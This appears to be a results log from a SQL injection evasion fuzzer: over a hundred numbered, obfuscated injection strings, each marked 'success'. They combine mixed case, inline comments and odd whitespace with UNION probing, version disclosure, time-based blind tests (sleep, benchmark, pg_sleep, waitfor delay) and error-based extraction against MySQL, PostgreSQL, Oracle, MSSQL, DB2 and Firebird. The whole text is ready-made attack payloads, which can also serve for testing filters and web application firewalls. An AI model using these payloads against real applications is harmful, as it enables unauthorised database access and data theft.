817 success "0x1' iN boolean mode  )/**/  union/**/all selecT null,null,null,null,null-- "
819 success '0x1%" /**/)  /**/union all SELECT null,null,null,null,null,null,null,null,null,null-- m0'
822 success 'iif  (/*3NZ*/ 4460 \xa0 LIKE   1610,1,0x1/0  ) /**/ '
823 success ' SelECt * From users wHERe id   like /**/\x0b(SeLect 1) oR @#",   LiKe/*Jr*/  0x1 union seLeCT 1,version  (    )   -- 0x1 /D'
825 success '0x1%"  )   OR 0x3fe  =    (  select count  (/*FIah)*/ *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5/**/ )  -- q\''
826 success '-1390%"  /**/)    )    union all select 8930,8930,8930,8930,8930# I['
829 success 'selECT CaSE When 2599  =  7035 tHeN 1 eLse null End-- '
830 success "SelEcT count  (  *  )  \x0cfroM domain.domains AS t1,domain.columns as t2,domain.tables aS t3 aND    (    (   'zaru'  =  'zaru "
834 success '1" WheRE 2619   LiKE /*1k?*/ 2619 aND 0xb07   LIKe \n 5100# '
836 success '-(SELECT 4830)"   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )   \t) \x0c ||  (  select   (  case when   (  \'?\'<>\'?K\'  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  (SELECT 118)  )  ||chr  (  (SELECT 122)  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  "dyut"  =  "dyut '
837 success '1 And   (  sELECt 2*  (  iF   (    (   SElEct * From   (  seLecT concat  (  0x7171706a71,  (  sEleCt   (  elt  (  6501 lIKE 6501 anD 1215=1215,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj '
838 success ' sELeCt * fROM users WHEre id  =  1 Or @#"{  =  1 or 9842!=9843 -- 1 '
839 success '(sElect (selECT (SELECT 1)))   )    )     )   OR sleep  (  (SeleCT\n5)  )  # '
840 success ' SelEct * frOm users WheRE id   LIKE   1. union Select null,version  (    ) /*\x0c4GF*/ -- 0x1 '
846 success "(sELect/**/1)'+  (  select 'sacd' where 5984  = \x0b0x1760 OR False OR 'pl' LIKE 'pl0' union all seLECT/**/null,null,null,null,null,null,null# "
851 success "0x1' wheRE 'D'='D' OR 2571 LIKE 2572 or 235 NOT LIKE 235 OR False OR (SELECT 8147)=8148 OR 6793  =    (  SeLEcT 6793 frOm pg_sleep  (  5   )  /**/ )   -- "
852 success 'SELECT count  (  *  )   fROM rdb$fields as t1,rdb$types aS t2,rdb$collations AS t3,rdb$functions AS t4 &&    (    (   \t (  "dskh"  =  "dskh '
853 success ' (  cAsE whEN (seleCt 0x20e6)   LiKe   8452 tHEn 1 ELsE null eND  )  '
855 success 'SeLecT count  (  *  ) \x0b FROM sysibm.systables aS\x0bt1,sysibm.systables As t2,sysibm.systables aS t3 and    (  /*M*/ (   "%"   LIke   " '
858 success 'iif  (  4638  =  8258,1,1/0x0  ) /**/ '
860 success "1'+  (  seLeCT eluw wHeRE 7305 in (7304,7305,7306) oR 0 And 1 "
862 success "(SELECT 0x1)'  )   rlike   (  SELECT * fROm   (  seleCT  (  sleep\t (  0x5  /*}_H*/)    )   \n )  sgvo  )  "
863 success ' select/**/* from\x0cusers where id   like   (SELECT (SELECT 1)) *\\. union select null,@@VERSION -- 1 '
865 success ' select *\x0cfroM users WHEre id   LiKE   1 or 1#"? union Select \'a\',version  (    )   -- 1 '
870 success 'SELECt count  (  *  )   FRoM sysibm.systables AS t1,sysibm.systables aS t2,sysibm.systables As t3 AND   (  "lsvg" like/**/"lsvg '
873 success "-(SELECT 2733)'   )    )     )   or 4144  =  \x0b (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  (SELECT 106)  )  ||chr  (  113  )  ||  (  select   (/**/ case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx "
878 success '0x1" rlike sleep  (  5  )   and "rylv" like "rylv '
879 success "(SeLECt 1)'+  (  select/**/'mdxt' whErE 0xaad  =  0xaad oR\x0c4240   like     (  SeLecT 0x1090 FROm pg_sleep  (  5   )    )   -- rH5"
880 success "-0x260b' or 8571  = /**/8571-- "
881 success "0x1' iN boolean mode  )   AnD 0x1091  =  convert  (  int,  (  SElECT char  (  113  )  +char  (  113/**/ )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sELeCt   (  CaSE WheN   (  4241  =  4241 OR 1446=1447  )   tHEn char  (  49  )   elsE char  (  48  )   End   )    )   +char  (  113  )  +char  (  122  ) /* lS*/+char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # _"
882 success "(sElect/**/1)'  )/**//*wW*/ union\tall\nSeLEcT null-- "
883 success '1/**/ )   aS tbve wHErE 4828   LIKE   0x12dc '
884 success "0x1' in boolean mode  )   and 0x954  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   # "
885 success "iif  ( /*L*/9792 LIKE 9792 AND '8'!='8k',1,1/0 \n)   "
886 success "-(SELECT 6155)%' \t )    )    union all SeLecT 2421,(SelecT 2421),(SELECT 2421),2421,0x975# "
888 success 'SeLecT   (  CASE WhEN   (  8978   likE   0x592  )   tHen 1 eLSE (SElECT 0x2312)*  (  seLect 8978 frOM master..sysdatabases  )   enD  )  -- \x0cA'
891 success " (  sElecT * frOM   (  SeleCt \n(  sleep  (  0x5   )    )     )  srmq  )    aNd  'fdgq'   LikE   'fdgq "
896 success '-2013"   )    )    as kisy wheRe \'S\rAm\' NOT LIKE \'S\rAm~\' Or (SELEct 5903)  =    (  \'qqpjq\'||  (  sELecT CASe 5903 when 5903 theN 1 eLse 0 ENd fRom rdb$database/**/ )  ||\'qzvzq\'  )  -- '
897 success ' SElECt * FROm\tusers WHERe id \x0c LIkE   (SElECT (SeLeCT 1)) +\\. union SELeCT null,@@VERSION -- 0x1\n'
899 success "1 WHEre 'Rb'<>'Rb.' OR False oR 8156  =    (  SeLEct count  (  *  )   FrOm generate_series  (  (SELECT 1),(SELECT 5000000)   )    )   -- \\"
903 success 'sELeCt   (  CASE WHeN   (  3537  =  5218  )   tHeN 3537 ElSe 3537*  (  SElect 3537 FROM mysql.db  )  \teNd  )  # '
905 success "-(SelEcT 8028)%'/**/  )  \x0b )     )   OR 5042   Like   5214 "
906 success '-5640"/*A[Y*/  )    ) \t  Or 9792  =  2728-- '
910 success "1'\x0c  )    )    As iuta WHERE 1482  =  1482 "
911 success '  (  SElECt count  (  *  )   fROM sysibm.systables aS t1,sysibm.systables AS t2,sysibm.systables as t3  )   '
913 success '|| 0x1 In   (  SELeCT @@version  )  -- 3'
914 success 'SeLecT cASe When 7634   lIKE   3954 THeN 1 ELSe null END-- ~7'
917 success ' SElEcT * frOM users WheRe id  =  1.<1# union select (SELECT 1),version  (    )   -- 1 '
918 success '  (/**/ sElEcT * frOM   (  SELECt  (  sleep  (  (SEleCt 5)   )    )     )  srmq  )   aNd    (    (     (  "sxih"  =  "sxih '
919 success "0x1' Where 'q3%'='q3%' ANd 0x1ffd  =    (  SeLEct count  (  *  )   fROM sysibm.systables aS t1,sysibm.systables as t2,sysibm.systables as t3  )  -- "
920 success '0x1"\nand 6240  =    (  \'qqpjq\'||  (  select case 6240 when 6240 then 1/**/else 0 end from rdb$database  )  ||\'qzvzq\'  )   and "tjbe" like "tjbe '
921 success '0x1  )   whEre 7026   like   7026 '
923 success 'SeLEct count  (  *  )   from rdb$fields As t1,rdb$types As t2,rdb$collations as t3,rdb$functions aS t4 and \t (  1473  =  0x5c1 '
926 success "1/*{F]}*/  )    )    as sfan where '2'!='2,' OR (SELECT 5684) LIKE 5685 and 7017  =  0x1cbe "
932 success '1 whErE 580=580 '
934 success '0x1   )    )    And 6537   likE   dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  (SELECT 116)  )  ||chr  (  117  )  ||chr  (  65  )\n ,5  )   and    (    (   6010  =  6010 Or False '
935 success " or/**/uname like '% "
940 success "0x1'+  (  select hsef where 4136  =  4136 or 8421  =    (  select count  (  *  )   from generate_series  (  1,0x4c4b40\x0c  )    )     )  +' "
941 success 'SelecT dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )   oR chr  (  79  )\xa0 ||chr  (  101  )  ,5  )   From dual aNd    (    (   "gydr" likE "gydr '
942 success "sELEcT count  (  *  )   FRoM generate_series  (  1,5000000  )   ANd 'roca'  =  'roca "
944 success "-0x248e' OR 9887  =\x0c (sELECT 2569)-- "
946 success "-(SELECT 6030)%'  )  /**/|| 3038/**/\n=  3038 AND True or 0 "
947 success '0x1"  )\x0b  AS dgzf WHErE 0x12e2   LIkE   4834 Or False Or 1235 LikE (SELECT 1236) '
948 success "1'/**/AND/**/'[](SELECT\n8)'='[]0x8'-- BR"
949 success '-6076"   )    )    or/*U[*/8277  =  (SELECT (SELECT 4757)) '
950 success "1' wherE 8822 NOT LIKE 8823 ANd make_set  (  8403  =  0x20d3,8899  )  --\x0c"
951 success "0x1'+  ( \tselect 'drvv' where 0x15f6  =  5622 and 3580   like     (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- e4"
952 success 'sElECT count  (  *\x0b )   FrOM domain.domains AS t1,domain.columns aS t2,domain.tables AS t3 ANd "%"   LIke   "/**/'
953 success "waitfor\x0bdelay/**/'0:0:0x5'/*eq\nc*/"
954 success '0x1" /**/ )    ) \x0b  and make_set  (  1167  =  5027,0x13a3  )   and    (    (   "grfi"  =  "grfi '
955 success ' selECt * fRoM users WherE id  =  1 OR/**/@#";  = /**/1 OR \'j\' liKE \'j\' -- 1 '
956 success '0x1" where 9461/**/  like \n\n9461 '
960 success "hi' oR 6530 NOT LIKE 6531 AND True -- "
964 success "1'+  (  select/**/rdwb/**/where 'P' NOT LIKE 'P.' and\x0b3429  =  7639-- wX"
966 success "a'/**/--\t"
967 success "1'+  (/*j*/ select/**/'vtyw' WhEre 7950   lIkE   7950 order by 1-- "
970 success 'SEleCT   (  CASE WheN   (  6166   LIke   3364  )   tHEn 6166 elSe cast /**/(  1 As int  )  /  (  sEleCT 0 FrOm dual  )   eNd  )   fRoM dual-- '
971 success "-5130'/**/  ) \n  )   /**/union all SeLEcT 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218-- "
975 success 'SELEct   (  CaSe whEN   (  8331  =  5625  )   thEN 8331 ELsE 8331*  (  seleCT 8331 FrOM mysql.db  )   ENd  )  # 5S'
977 success '1 && sleep  ( /**/5  )  # '
979 success 'sELEct\x0cpg_sleep\n (  0x5/**/ )   ANd "zhsc"  = \x0c"zhsc '
980 success 'SelECt\xa0benchmark  (  0x4c4b40,md5  (  0x4c4d6142   )   /**/)   # idxq p'
981 success '(SELEct (seLecT 0x1))"   )    )    and   (  3020  =  3020 OR \'+\'!=\'+\' OR\x0b0x0 AND \' K\' NOT LIKE \' K@\'  )  *(SELECT 6703) and  \x0b (    (   "bely"  =  "bely '
983 success '-(SELECT 9864)"  )   or elt  (  5885  =  4936,4936  )   and   (  "bfbb" like "bfbb/**/'
985 success "0x1   )/**/   )     )   ANd 0x196e  =    ( \nSELECt count  (  *  )   FROM sysusers aS sys1,sysusers As sys2,sysusers As sys3,sysusers aS/*9\\H*/sys4,sysusers As sys5,sysusers as sys6,sysusers AS sys7  )   &&    (    (     (  'VL|c' not like 'VL|cu' "
987 success '0x1" union all select null,null,null,null,null,null,null,null,null,null# g3'
988 success 'sELeCT   (  CAse whEN   (  9030   liKe   9185  )   thEn 9030 ElSe 9030*  (  selEct 9030 FRom information_schema.character_sets  )  \tenD  )  # '
989 success '0x1" and (SELECT (SELECT 3824))  =  benchmark  (  0x4c4b40,md5  (  0x76555642   )    )    and "tqbi" \n=  "tqbi/*q*/'
990 success "1'+  (  select/**/dklj where '0x0' LIKE '0' "
992 success "-0xb35'  /**/)\x0b   )    union all selecT 0xc90-- t"
993 success "1'\x0c )   where 5624=5624 && 1 "
998 success '1" WHERe 5028 In (5027,5028,5029) AnD True anD char  ( /**/120  )  ||char  ( \n106  )  ||char  (  117  )   oR char  ( /**/85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- '
1000 success "(SELECT/**/1) where/**/'\\ybE'='\\ybE' AND True "
1002 success "-0xc23'  )   whEre 7782  =  7782 Or 8571  = /**/8571-- "
1003 success '0x1" \t )    )    AS jrld whERe (SELECT 0xda0)  =  0xda0 '
1005 success "enD anD    (    ( \x0c   (/**/ 'xzbk'  =  'xzbk "
1009 success '"  )   Or benchmark/**/ (  10000000,MD5  (/*r`su$*/ 1   )    )   # '
1015 success '0x1  )   where 2679 /*{n*/=  (SELECT (SELECT 2679)) or 0x1333  =\x0c   (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- '
1017 success '-0x234d%" union all SeLEcT 6583# d?'
1018 success "-0x669'/**/union\xa0all SElECt (SElEcT 0x12e3)# "
1019 success "-9429' /*G7at*/)   order by 1-- "
1022 success 'elt  (  2567   LIKE   9921,0x26c1\x0c )   '
1023 success "0x1'||/*msL*/ (  select 'wgte' from dual where/*~3xIO*/4693<>4694 OR 0 and   (  select 0x2*  (  if   (    (   select * from   (  select concat/**/ (  0x7171706a71,  (  select   (  elt  (  3484  =  3484 AND 'H:l'<>'H:l(' AND 'qM\t8'<>'qM\n8e',1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, (SELECT 8446744073709551610)   )    )     /**/)    )   ||' "
1024 success "seLECT count  (  *  )   FrOM sysibm.systables aS t1,sysibm.systables AS t2,sysibm.systables AS t3 anD    (    (   'ootz' LikE 'ootz "
1026 success '(sElECT 0x1) AnD char  ( \x0b120  )  ||char  (  106  )  ||char  (  117  )   Or char  (  85  )     LIKE   regexp_substring/**/ (  repeat  (  right  (  char  (  9981  )  ,(selECt 0)  )  ,5000000000  )  ,null  )/**/  '
1028 success 'SeLeCT   (  case whEN   (  0x241e   LiKE   6326  )   ThEn\x0b9246 ElsE 9246*  (  SeLEcT 9246 FrOM mysql.db  )   End  )  # '
1029 success ' (  selecT char  (  113  )  +char  (  0x71  )  +char  (  112  )  +char  (  106  )  +char  ( /**/113  )  +  (  sElECt   (  caSe WHeN   (  1931  =  1931  )   tHen char  (  49  )   ElSE char  (  48  )   End   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )  '
1030 success "0x1'  )  \xa0where/**/'fK\n' LIKE 'fK\n' && True oR (sELECt 8421)  =    (  SELect count  (  *  )   FROM generate_series  (  1,0x4c4b40   )    )   -- wdG7#"
1031 success "SEleCt pg_sleep  (  5  )   anD '%'  = /**/' "
1033 success "sELeCT count  (  *  )   frOm sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables aS t3\t )  +' "
1035 success "1'/**/  )    )    as jtmf where 7620 like 7620 OR 0 OR 0 OR 0 "
1039 success "sEleCt count  (  *  )   frOM all_users t1,all_users\x0ct2,all_users t3,all_users t4,all_users t5  )/*&*/ +' "
1041 success 'sElecT   (  caSE WhEn   (  4780  =  4432  )/*wb}H*/ \xa0then 4780 eLSe 4780*  (  sELEcT 0x12ac froM mysql.db  )   END  )  # '
1042 success "-7962'   )    )    aS pgqz WHErE 6058  =  6058 oR 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )   Or chr  (  113  )  ||  (  SELECt   (  cASe WhEN   (  4493  =  4493  )   tHen (sELeCt 1) ElSE 0 eNd  )   FRoM dual  )  ||chr  (  (seLECT 113)  )  ||chr  (  122  )  ||chr  (  118  )   OR chr  (  122  )  ||chr  (  113   )    )   -- "
1043 success "1'/**/rlike sleep/**/\x0c(  5  )  "
1044 success 'SeLect   (  CAsE WHeN   (  7822  =  4430  )   ThEN 7822 ElsE 1/  (  sElect 0  )   EnD  )  -- '
1047 success "0x1  )   wHeRe 'm' NOT LIKE 'm}'/**/"
1048 success 'sElEcT count  (  *  )   frOm rdb$fields aS t1,rdb$types As t2,rdb$collations aS t3,rdb$functions AS t4 AND    (    (   6977   LIke   6977 aNd 5654 LIke 5654 Or 6356 NOT iN (6355,6356,6357) oR 0 Or 0 OR False '
1050 success '-(SELECT 1203)"   )    )   /*F\'n*/or 0x217b  =  0x217b-- '
1053 success " selECt * frOM users wHERE id  =  '1' union SELecT \\.#,@@VERSION -- 1' "
1054 success "1'/**//**/)   as noqp where 4042  =  4042 OR 0 or 8315   like     (  select/**/count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- "
1056 success 'SeLeCT CaSE wHen 8227   LIke /**/ 1229 tHEn 1 ElSe/*Ip*/null eNd-- '
1058 success '0x1"  )   WHErE 0x1357  =  (SELECT 4951) '
1060 success " selEct * fRom users WHeRE/**/id  =  '0x1' || ||/2130 NOT LIKE 2131 OR False or 0 oR\x0bFalse union/**/seLect (SElecT 1),version  (    )   -- 0x1' "
1061 success "(SELECT 0x1)'||\n (\t/**/select 'brsr' WHERE 0x1552 /*Z\rS:*/ like  /**/0x1552 "
1067 success '-5322" union all/*m!*/select 6494,0x195e,6494,6494,6494,6494--/**/'
1068 success '0x1"\x0cWHERE 8387/*0*/  like \t 8387 '
1070 success '-(SELECT 3707)"   ) /**/ \x0b)     )   OR \'n\' NOT LIKE \'n[\'-- W'
1072 success '(SELECT 0x1)"  )\x0b/**/ WHErE 0x1d7c   LIkE/**/  7548/**/'
1073 success "-(SELECT 1587)'  )\x0b  oR 8339   like   5540 "
1074 success "(SELECT 0x1)'  )   aS bzem wHERe 'p'<>'pu'\x0bANd True "
1077 success '(SelEcT 1) && char  (  120/**/ )   oR char  (  106  )  ||char  (  117  )   OR char  (  (SELECT 85)  )     LIKE   regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,0x12a05f200  )  ,null  )  # jcdh }K'
1078 success "0x1  )/**/  Where 's'='s'\t"
1080 success " or '0x1'  \x0c LIKE    '0x1 "
1081 success "-(SELECT 4032)'  )   where 6447 like 6447 OR 1809  =  2810# j)"
1091 success "(SELECT 0x1)'+  (  select 'dhcv' where 6713 LIKE 6713 OR False "
1096 success '-4408"  )  /**/or 0x1ad8  =  6872 and   (  "oenu"  =  "oenu '
1100 success "-6733'  )   WhEre 9260 in (9259,9260,9261)/**/union all SELect 4024,4024,4024,4024# 8"
1103 success "seLECT * fROM users wheRE id  =  (SELECT 1) +   (  $+  ) /**/ Or 3647!=3648 AND 1880 IN (1879,1880,1881) OR 'q'<>'q' -- 1 "
1104 success '-6218\'/**/  )  /**%\\c*/ )    || (SELECT 2236)   LikE   4469# ""F'
1105 success "-8860  )   OR 4144  =    (  SELEcT upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  0x71  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  SElECt   (  CaSe when   (  4144  =  4144 oR 'k'='kb'  )   ThEn 1 ELsE 0 ENd  )   FrOM dual\x0b )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  0x7a  )  ||chr  (  113  )  ||chr  (  62   )    )     )   FROm dual  )  "
1107 success '0x1  )   as cinw where 8870 IN (8869,8870,8871) && 8594   LIKE     (\x0c select (SELECT 8594) from pg_sleep  (/**/ 5   )   /**/)\t  -- ez'
1110 success 'seLEct  \t(  Case whEn   (  7163   Like   (sElEct 1777)  )   tHEN (SElect 1) eLsE 7163*  (  SELect 7163 From master..sysdatabases  )   End /**/)  -- '
1114 success '(SELECT 0x1)"  )   and (SELECT (SELECT 2388))  =  benchmark  (  5000000,md5  (  0x6d457153   ) \t  )   # '
1121 success '0x1" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  0x55  )    =  regexp_substring  (  repeat  (  right  (  char /**/(  9981  )  ,0  )  ,5000000000  )  ,null  )   and "cecf"  =  "cecf '
1122 success "SELEct count  (  * /**/)   frOM generate_series  (  0x1,(SeleCT (SeLEcT 5000000)) \t)   AnD    ( /**J*/\x0c (   'hxcq' \xa0 LIke   'hxcq "
1123 success "-1602' or 9057 NOT LIKE 0x2362 "
1124 success 'sElEct CASE wHEn 2930\t = \n(SELect 7964) tHEN 1/**/elSE null enD-- '
1125 success '0x1 anD 0x15b4  =    (  SElect count  (  *  ) \t FRom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj '
1126 success 'SeLEcT   (  CaSe WHeN   ( \t0x166c   LikE   7636  )   TheN 5740 elsE cast  (  (SelEct (SELECT 1)) AS int  )  /  (  sEleCt 0 from dual  )   End  )   fROm dual-- <[hc'
1129 success "-(SELECT 9657)'  )   as ziiq where 0x1e2d   like   7725\xa0OR 3038/**//**/=  3038 AND True "
1132 success "1'+  (  select 'zohk' wHEre 5502   lIKE   5502 OR 2367   likE     (  sElect count  (  *  )   FRom rdb$fields aS t1,rdb$types as t2,rdb$collations AS t3,rdb$functions As t4  )  -- "
1134 success "-2190'/**/ )   where 8890\t =  0x22ba union all select 8890,8890# "
1137 success "SElEcT count  (  *  )   FROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 aND   (  'wweo'  =  'wweo "
1139 success "(SElECT (SELECT 1))' WhERe 0x1095   lIkE  /**/0x1095 union all seLect\x0bnull,null-- !"
1140 success ' ENd ANd    (    (   "%"  =  " '
1141 success "(SELECT (SELECT 0x1))'/**/ )\t  As nftr wheRE 0x2279  =  0x2279 oR   (  SELECT * frOM   (  SELECt  (  sleep  (  (SELECT 5)   )    )     )  sddo  )  # "
1144 success ' SEleCT * fRom users WherE id  = /**/1 OR "?  (  " OR 1/**/  lIke   1 -- 1\n'
